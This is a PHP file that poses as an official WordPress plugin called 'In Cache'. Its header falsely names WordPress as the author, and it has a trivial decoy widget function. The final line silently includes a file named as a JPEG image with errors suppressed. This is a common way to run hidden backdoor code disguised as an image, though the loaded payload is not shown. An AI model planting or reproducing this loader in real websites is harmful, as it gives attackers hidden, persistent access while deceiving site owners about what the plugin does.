<?php
/*
Plugin Name: In Cache
Plugin URI: http://wordpress.org/#
Description: Official WordPress plugin
Author: WordPress
Version: 2.4.5
Author URI: http://wordpress.org/#
*/

function update( $new_instance, $old_instance ) {
	$instance['title'] = strip_tags( $new_instance['title'] );
	return $instance;
}

@include './front/incache.jpeg';